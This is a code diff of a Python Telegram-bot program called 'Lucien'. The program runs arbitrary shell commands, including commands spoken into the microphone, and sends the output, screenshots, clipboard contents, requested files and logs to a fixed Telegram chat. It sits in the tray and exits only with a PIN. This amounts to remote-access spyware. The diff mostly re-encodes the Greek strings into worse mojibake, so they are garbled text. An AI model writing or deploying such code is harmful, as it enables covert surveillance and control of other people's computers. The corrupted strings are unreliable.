@@ -1,3 +1,4 @@
+﻿# -*- coding: utf-8 -*-
 import telebot
 import subprocess
 import pyautogui
@@ -49,12 +50,12 @@ def format_date(ts):
 
 def scan_folder(path):
     if not os.path.exists(path):
-        return "Ã¢ÂÅ’ ÃŽÅ¸ Ãâ€ ÃŽÂ¬ÃŽÂºÃŽÂµÃŽÂ»ÃŽÂ¿Ãâ€š ÃŽÂ´ÃŽÂµÃŽÂ½ Ãâ€¦Ãâ‚¬ÃŽÂ¬ÃÂÃâ€¡ÃŽÂµÃŽÂ¹."
+        return "ÃƒÂ¢Ã‚ÂÃ…â€™ ÃƒÅ½Ã…Â¸ ÃƒÂÃ¢â‚¬Â ÃƒÅ½Ã‚Â¬ÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚Â¿ÃƒÂÃ¢â‚¬Å¡ ÃƒÅ½Ã‚Â´ÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â½ ÃƒÂÃ¢â‚¬Â¦ÃƒÂÃ¢â€šÂ¬ÃƒÅ½Ã‚Â¬ÃƒÂÃ‚ÂÃƒÂÃ¢â‚¬Â¡ÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â¹."
     try:
         entries = os.listdir(path)
         if not entries:
-            return "Ã°Å¸â€œâ€š ÃŽÅ¸ Ãâ€ ÃŽÂ¬ÃŽÂºÃŽÂµÃŽÂ»ÃŽÂ¿Ãâ€š ÃŽÂµÃŽÂ¯ÃŽÂ½ÃŽÂ±ÃŽÂ¹ ÃŽÂ¬ÃŽÂ´ÃŽÂµÃŽÂ¹ÃŽÂ¿Ãâ€š."
-        lines = [f"Ã°Å¸â€œÂ {path}"]
+            return "ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Å¡ ÃƒÅ½Ã…Â¸ ÃƒÂÃ¢â‚¬Â ÃƒÅ½Ã‚Â¬ÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚Â¿ÃƒÂÃ¢â‚¬Å¡ ÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â¯ÃƒÅ½Ã‚Â½ÃƒÅ½Ã‚Â±ÃƒÅ½Ã‚Â¹ ÃƒÅ½Ã‚Â¬ÃƒÅ½Ã‚Â´ÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â¹ÃƒÅ½Ã‚Â¿ÃƒÂÃ¢â‚¬Å¡."
+        lines = [f"ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â {path}"]
         for entry in entries:
             full = os.path.join(path, entry)
             if os.path.isfile(full):
@@ -63,16 +64,16 @@ def scan_folder(path):
                 lines.append(f"- {entry} | {format_size(size)} | {format_date(date)}")
         return "\n".join(lines)
     except Exception as e:
-        return f"Ã¢Å¡Â Ã¯Â¸Â ÃŽÂ£Ãâ€ ÃŽÂ¬ÃŽÂ»ÃŽÂ¼ÃŽÂ± ÃŽÂºÃŽÂ±Ãâ€žÃŽÂ¬ Ãâ€žÃŽÂ¿ scan: {str(e)}"
+        return f"ÃƒÂ¢Ã…Â¡Ã‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â ÃƒÅ½Ã‚Â£ÃƒÂÃ¢â‚¬Â ÃƒÅ½Ã‚Â¬ÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚Â¼ÃƒÅ½Ã‚Â± ÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚Â±ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â¬ ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â¿ scan: {str(e)}"
 
 def execute_command(command):
     try:
         result = subprocess.check_output(command, shell=True, text=True)
         return result
     except subprocess.CalledProcessError as e:
-        return f"Ã¢ÂÅ’ ÃŽÂ£Ãâ€ ÃŽÂ¬ÃŽÂ»ÃŽÂ¼ÃŽÂ±:\n{e.output}"
+        return f"ÃƒÂ¢Ã‚ÂÃ…â€™ ÃƒÅ½Ã‚Â£ÃƒÂÃ¢â‚¬Â ÃƒÅ½Ã‚Â¬ÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚Â¼ÃƒÅ½Ã‚Â±:\n{e.output}"
     except Exception as e:
-        return f"Ã¢Å¡Â Ã¯Â¸Â ÃŽâ€¢ÃŽÂ¾ÃŽÂ±ÃŽÂ¯ÃÂÃŽÂµÃÆ’ÃŽÂ·:\n{str(e)}"
+        return f"ÃƒÂ¢Ã…Â¡Ã‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â ÃƒÅ½Ã¢â‚¬Â¢ÃƒÅ½Ã‚Â¾ÃƒÅ½Ã‚Â±ÃƒÅ½Ã‚Â¯ÃƒÂÃ‚ÂÃƒÅ½Ã‚ÂµÃƒÂÃ†â€™ÃƒÅ½Ã‚Â·:\n{str(e)}"
 def take_screenshot():
     try:
         path = os.path.join(BASE_PATH, "screen.png")
@@ -103,7 +104,7 @@ def check_inactivity():
             if os.path.exists(log_path) and not os.path.exists(sent_flag):
                 try:
                     with open(log_path, 'rb') as f:
-                        bot.send_document(CHAT_ID, f, caption="Ã°Å¸â€¢â€œ 24h inactivity Ã¢â‚¬â€œ ÃŽÂ±Ãâ€¦Ãâ€žÃÅ’ÃŽÂ¼ÃŽÂ±Ãâ€žÃŽÂ¿ log")
+                        bot.send_document(CHAT_ID, f, caption="ÃƒÂ°Ã…Â¸Ã¢â‚¬Â¢Ã¢â‚¬Å“ 24h inactivity ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Å“ ÃƒÅ½Ã‚Â±ÃƒÂÃ¢â‚¬Â¦ÃƒÂÃ¢â‚¬Å¾ÃƒÂÃ…â€™ÃƒÅ½Ã‚Â¼ÃƒÅ½Ã‚Â±ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â¿ log")
                     open(sent_flag, 'w').close()
                 except:
                     pass
@@ -114,8 +115,8 @@ def watch_network():
         try:
             ip = socket.gethostbyname(socket.gethostname())
             if previous_ip and ip != previous_ip:
-                bot.send_message(CHAT_ID, f"Ã°Å¸Å’Â ÃŽÂÃŽÂ­ÃŽÂ± IP ÃŽÂ±ÃŽÂ½ÃŽÂ¹Ãâ€¡ÃŽÂ½ÃŽÂµÃÂÃŽÂ¸ÃŽÂ·ÃŽÂºÃŽÂµ: {ip}")
-                log_action(f"IP ÃŽÂ¬ÃŽÂ»ÃŽÂ»ÃŽÂ±ÃŽÂ¾ÃŽÂµ: {previous_ip} Ã¢â€ â€™ {ip}")
+                bot.send_message(CHAT_ID, f"ÃƒÂ°Ã…Â¸Ã…â€™Ã‚Â ÃƒÅ½Ã‚ÂÃƒÅ½Ã‚Â­ÃƒÅ½Ã‚Â± IP ÃƒÅ½Ã‚Â±ÃƒÅ½Ã‚Â½ÃƒÅ½Ã‚Â¹ÃƒÂÃ¢â‚¬Â¡ÃƒÅ½Ã‚Â½ÃƒÅ½Ã‚ÂµÃƒÂÃ‚ÂÃƒÅ½Ã‚Â¸ÃƒÅ½Ã‚Â·ÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚Âµ: {ip}")
+                log_action(f"IP ÃƒÅ½Ã‚Â¬ÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚Â±ÃƒÅ½Ã‚Â¾ÃƒÅ½Ã‚Âµ: {previous_ip} ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ {ip}")
             previous_ip = ip
         except:
             pass
@@ -130,10 +131,10 @@ def recognize_speech():
                 audio = recognizer.listen(source, timeout=5)
             command = recognizer.recognize_google(audio, language='el-GR')
             if command:
-                log_action(f"Ã°Å¸Å½â„¢Ã¯Â¸Â ÃŽÂ¦Ãâ€°ÃŽÂ½ÃŽÂ®: {command}")
+                log_action(f"ÃƒÂ°Ã…Â¸Ã…Â½Ã¢â€žÂ¢ÃƒÂ¯Ã‚Â¸Ã‚Â ÃƒÅ½Ã‚Â¦ÃƒÂÃ¢â‚¬Â°ÃƒÅ½Ã‚Â½ÃƒÅ½Ã‚Â®: {command}")
                 output = execute_command(command)
                 if output:
-                    bot.send_message(CHAT_ID, f"Ã°Å¸â€”Â£Ã¯Â¸Â {command}\nÃ°Å¸â€œÂ¤ {output[:4000]}")
+                    bot.send_message(CHAT_ID, f"ÃƒÂ°Ã…Â¸Ã¢â‚¬â€Ã‚Â£ÃƒÂ¯Ã‚Â¸Ã‚Â {command}\nÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¤ {output[:4000]}")
         except sr.UnknownValueError:
             continue
         except:
@@ -155,16 +156,16 @@ def send_log_now(icon, item):
         log_path = os.path.join(LOG_FOLDER, today)
         if os.path.exists(log_path):
             with open(log_path, 'rb') as f:
-                bot.send_document(CHAT_ID, f, caption="Ã°Å¸â€œÂ ÃŽÂ§ÃŽÂµÃŽÂ¹ÃÂÃŽÂ¿ÃŽÂºÃŽÂ¯ÃŽÂ½ÃŽÂ·Ãâ€žÃŽÂ· ÃŽÂ±Ãâ‚¬ÃŽÂ¿ÃÆ’Ãâ€žÃŽÂ¿ÃŽÂ»ÃŽÂ® log")
+                bot.send_document(CHAT_ID, f, caption="ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â ÃƒÅ½Ã‚Â§ÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â¹ÃƒÂÃ‚ÂÃƒÅ½Ã‚Â¿ÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚Â¯ÃƒÅ½Ã‚Â½ÃƒÅ½Ã‚Â·ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â· ÃƒÅ½Ã‚Â±ÃƒÂÃ¢â€šÂ¬ÃƒÅ½Ã‚Â¿ÃƒÂÃ†â€™ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â¿ÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚Â® log")
     except:
         pass
 
 def tray():
     global icon_instance
     icon_instance = Icon("Lucien", create_icon(), "Lucien", menu=Menu(
-        item('Ã°Å¸â€œÂ¤ Send Log Now', send_log_now),
-        item('Ã°Å¸â€œÂ Show Status', show_status),
-        item('Ã°Å¸â€â€™ Exit (PIN ÃŽÂ¼ÃÅ’ÃŽÂ½ÃŽÂ¿)', lambda icon, item: None)
+        item('ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¤ Send Log Now', send_log_now),
+        item('ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â Show Status', show_status),
+        item('ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â„¢ Exit (PIN ÃƒÅ½Ã‚Â¼ÃƒÂÃ…â€™ÃƒÅ½Ã‚Â½ÃƒÅ½Ã‚Â¿)', lambda icon, item: None)
     ))
     icon_instance.run()
 @bot.message_handler(func=lambda message: True)
@@ -179,13 +180,13 @@ def handle_message(message):
     if command.startswith("/pin "):
         entered_pin = command[5:].strip()
         if entered_pin == PIN_CODE:
-            bot.send_message(message.chat.id, "Ã°Å¸â€Â PIN OK. ÃŽÂ¤ÃŽÂµÃÂÃŽÂ¼ÃŽÂ±Ãâ€žÃŽÂ¹ÃÆ’ÃŽÂ¼ÃÅ’Ãâ€š Lucien...")
+            bot.send_message(message.chat.id, "ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â PIN OK. ÃƒÅ½Ã‚Â¤ÃƒÅ½Ã‚ÂµÃƒÂÃ‚ÂÃƒÅ½Ã‚Â¼ÃƒÅ½Ã‚Â±ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â¹ÃƒÂÃ†â€™ÃƒÅ½Ã‚Â¼ÃƒÂÃ…â€™ÃƒÂÃ¢â‚¬Å¡ Lucien...")
             log_action("Lucien exited via PIN.")
             if icon_instance:
                 icon_instance.stop()
             os._exit(0)
         else:
-            bot.send_message(message.chat.id, "Ã¢ÂÅ’ ÃŽâ€ºÃŽÂ¬ÃŽÂ¸ÃŽÂ¿Ãâ€š PIN.")
+            bot.send_message(message.chat.id, "ÃƒÂ¢Ã‚ÂÃ…â€™ ÃƒÅ½Ã¢â‚¬ÂºÃƒÅ½Ã‚Â¬ÃƒÅ½Ã‚Â¸ÃƒÅ½Ã‚Â¿ÃƒÂÃ¢â‚¬Å¡ PIN.")
         return
 
     if command == "/screenshot":
@@ -200,10 +201,10 @@ def handle_message(message):
     if command.startswith("/get "):
         filename = command[5:].strip()
         if send_file(filename, message.chat.id):
-            bot.send_message(message.chat.id, f"Ã°Å¸â€œÅ½ ÃŽâ€˜Ãâ‚¬ÃŽÂµÃÆ’Ãâ€žÃŽÂ¬ÃŽÂ»ÃŽÂ·: {filename}")
+            bot.send_message(message.chat.id, f"ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â½ ÃƒÅ½Ã¢â‚¬ËœÃƒÂÃ¢â€šÂ¬ÃƒÅ½Ã‚ÂµÃƒÂÃ†â€™ÃƒÂÃ¢â‚¬Å¾ÃƒÅ½Ã‚Â¬ÃƒÅ½Ã‚Â»ÃƒÅ½Ã‚Â·: {filename}")
             log_action(f"File sent: {filename}")
         else:
-            bot.send_message(message.chat.id, f"Ã¢ÂÅ’ ÃŽâ€ÃŽÂµÃŽÂ½ ÃŽÂ²ÃÂÃŽÂ­ÃŽÂ¸ÃŽÂ·ÃŽÂºÃŽÂµ: {filename}")
+            bot.send_message(message.chat.id, f"ÃƒÂ¢Ã‚ÂÃ…â€™ ÃƒÅ½Ã¢â‚¬ÂÃƒÅ½Ã‚ÂµÃƒÅ½Ã‚Â½ ÃƒÅ½Ã‚Â²ÃƒÂÃ‚ÂÃƒÅ½Ã‚Â­ÃƒÅ½Ã‚Â¸ÃƒÅ½Ã‚Â·ÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚Âµ: {filename}")
         return
 
     if command.startswith("/scan "):
@@ -215,16 +216,16 @@ def handle_message(message):
     if command == "/clip":
         try:
             clip = pyperclip.paste()
-            bot.send_message(message.chat.id, f"Ã°Å¸â€œâ€¹ Clipboard:\n{clip}")
+            bot.send_message(message.chat.id, f"ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Â¹ Clipboard:\n{clip}")
             log_action("Clipboard sent.")
         except Exception as e:
-            bot.send_message(message.chat.id, f"Ã¢Å¡Â Ã¯Â¸Â Clipboard error: {str(e)}")
+            bot.send_message(message.chat.id, f"ÃƒÂ¢Ã…Â¡Ã‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â Clipboard error: {str(e)}")
         return
 
     if command == "/startup":
         try:
             result = execute_command("wmic startup get Caption, Command")
-            bot.send_message(message.chat.id, f"Ã°Å¸Å¡â‚¬ ÃŽâ€¢ÃŽÂºÃŽÂºÃŽÂ¯ÃŽÂ½ÃŽÂ·ÃÆ’ÃŽÂ·:\n{result}")
+            bot.send_message(message.chat.id, f"ÃƒÂ°Ã…Â¸Ã…Â¡Ã¢â€šÂ¬ ÃƒÅ½Ã¢â‚¬Â¢ÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚ÂºÃƒÅ½Ã‚Â¯ÃƒÅ½Ã‚Â½ÃƒÅ½Ã‚Â·ÃƒÂÃ†â€™ÃƒÅ½Ã‚Â·:\n{result}")
         except:
             pass
         return
